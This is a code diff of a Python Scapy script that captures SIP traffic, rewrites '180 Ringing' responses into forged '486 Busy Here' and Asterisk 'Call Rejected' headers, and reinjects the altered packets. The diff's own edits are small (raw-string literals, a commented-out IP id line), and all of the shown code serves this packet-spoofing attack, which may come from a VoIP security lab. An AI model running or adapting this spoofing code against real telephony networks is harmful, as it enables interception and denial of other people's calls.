@@ -17,11 +17,12 @@ def busy_timeout():
 
 
 def traffic_parser(packet):
-    BUSY_1 = 'SIP/2.0 486 Busy Here'
-    BUSY_2 = 'X-Asterisk-HangupCause: Call Rejected\r\nX-Asterisk-HangupCauseCode: 21'
+    BUSY_1 = r'SIP/2.0 486 Busy Here'
+    BUSY_2 = r'X-Asterisk-HangupCause: Call Rejected\r\nX-Asterisk-HangupCauseCode: 21'
 
     payload = packet[UDP].payload.load
 
+    sent_busy=False
     print(payload)
     # print(payload.decode("utf-8-sig"))
     payload = payload.decode("utf-8")
@@ -56,8 +57,8 @@ def traffic_parser(packet):
         # print(payload)
         
         # Implement packet modification
-        payload = payload.replace("SIP/2.0 180 Ringing", BUSY_1, 1)
-        payload = re.sub("Contact\:.*>", BUSY_2, payload,1)
+        payload = payload.replace(r"SIP/2.0 180 Ringing", BUSY_1, 1)
+        payload = re.sub(r"Contact\:.*>", BUSY_2, payload,1)
         # print(payload.replace('\\\\', '\\'))
         # payload = payload.replace("\\\\", "\\")
         # print(payload.encode("ascii","ignore"))
@@ -70,7 +71,7 @@ def traffic_parser(packet):
             ip_attributes['version']=packet[IP].version
             ip_attributes['tos']=packet[IP].tos
             ip_attributes['len']=511 #packet[IP].len
-            ip_attributes['id']=packet[IP].id+incr
+            # ip_attributes['id']=packet[IP].id+incr
             ip_attributes['flags']=packet[IP].flags
             ip_attributes['frag']=packet[IP].frag
             ip_attributes['ttl']=packet[IP].ttl
@@ -81,7 +82,7 @@ def traffic_parser(packet):
             ip = IP_layer(ip_attributes)
             
 
-            sendp(eth/ip/udp/Raw(load=payload))
+            sendp(eth/ip/udp/Raw(load=payload)  )
 
             # print(payload)
             # print(Raw(load=payload))
